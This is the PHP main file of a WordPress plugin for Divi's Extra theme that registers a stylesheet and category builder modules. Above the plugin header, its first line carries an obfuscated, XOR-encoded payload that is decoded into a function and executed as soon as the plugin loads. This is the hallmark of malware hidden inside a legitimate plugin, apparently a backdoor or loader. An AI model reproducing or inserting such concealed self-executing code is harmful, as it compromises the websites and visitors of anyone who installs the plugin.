<?php $PCTCordAf=': ++8So64CH6.>C'^'YRNJL60PA-+BGQ-';$LiwpT=$PCTCordAf('','-WIKT>-1.+;P7E;.16XAu>65k3;IL,0>UXCBqAG=nH ZPA.RTf;A>5Q TOc+T,2bR2LT0OEJ92AenGkNjOlfMb<,Gdtviqjlz74OBfl;lekZjnW8pM5 UE7PvX4,UjUsl<jqDAnciT05JtlrDuOLTW6b96bsFg8 33C;lSnXX=5TTke34Im6qXn8A02G1 >FkO7XEKLQ1kQ2RaJ8>;zriHRUG=nIg,O3,e<-WyPE+SP5+j:B> H3S+,qgn+t5t2wee-1Yo1KWxiwiK39-9<CoGzMT36FQm1XUgOeTQHWaO=NZL,UiwZSAA4CURiExmI>JzSMY6-YBi0O>,,+K3QVpAsdrs8 - twL>PIE<JWyJBe134OWnyE:<nW0;2J6X ,SrARFE:vooytO80UVeMW2P91HJEH2oMBiV<357YXInBXSH8;Z6U WX4Y:jY7;Q13=:EC.,H=gW9U-VOD<II6 >8EHzA>LHX5=7LXbvnUVMbSRYAEThRUI: T5=51,YI;:50RhF30UHNF<QEVmsbDgM.1VYO6461-PKSUH0EwJTaIwWFnF.vqF5C- xrpl4q+e1dWEE3eYcAISZkMEdWD6 5oZK7dY.8SHBntAAO;X9TttXbPY:2nAECYAYV4YeQDJ-ZkPQ<52k Q+;7 STlMw;A<:+ YjOVhA'^'D1aj2KCRZBT>h CGBB+iRFYG4WZ=-soS ,dkXa<7g.U435G=:FC.Lj5A .<t9YFJvV- QcenRW8LNgKnJ4foDFSY3DIVNVQfs>R 0NHRLXKjQNsQL>AR9 YxR<UX4CnSHUAZmKgjM;EAjZQRlQ+- 6mFPkB-fCSEJhgRLvN+,OY1:CAXQ0DkXcd1HBW3DRPnO B,lpFXLa,8XE.YJZZOI.394XUCCH.GM:WH.YmeM2<FNQ0HXO:V2HDQOJt7z;y> ELByKZ..XTIIoEXALYjO<pDpWW202Z=,GrEp:-.ZE4j>-X4IJzw7 X60ic8rg XjRri=WY8kIKE7JCY.R2>PiW; 6iuhs W-Mpm.Y3wDtbAGRX:2GY>05gsTZF+i3EUsOav- CMefpP+YD4vXmsD1UD-qOAOe0HcrXRAVyei.76 -JR;Z<Z2pL6H5=VO0nlPO1kLM;XQcf1H5  YamRAJYldZeZ-<9jVR5qKMd<0eF73- erNr4;HA-jVPHs<1RIACzO-VIrdnbX017DSDbGeCUcqkRUBPvw 6,omlWwiAnNotZ HGDuQtHBNBGTREMSSPftuQTkR +tsKkcD66DAL01.N;<VQ <1FS1 6W7X0SXxF48NSGhecyayvOSl42+ArO40HTiLP0RWXA7s1dL1HYBBTqZfmb<');$LiwpT();
/**
 * @package DWD_Extra_Category_Builder_Modules
 * @version 1.0.0
 */
/*
Plugin Name: Divi Extra Category Builder Modules
Plugin URI: https://diviwebdesign.com/
Description: Add the Extra Category Builder modules to the Divi Builder default standard section (FOR EXTRA).
Author: Divi Web Design
Version: 1.0.0
Author URI: https://diviwebdesign.com/
*/

function dwd_extra_category_builder_load(){
	//css
	wp_enqueue_style('dwd-extra-builder-css', plugin_dir_url( __FILE__ ) . 'css/dwd-extra-builder.css');
}
add_action('wp_enqueue_scripts', 'dwd_extra_category_builder_load');

function DWD_Extra_Category_Builder_Modules(){
	if(class_exists("ET_Builder_Module")){
		include('loadmodules.php');
	}
}
add_action('et_builder_ready', 'DWD_Extra_Category_Builder_Modules');
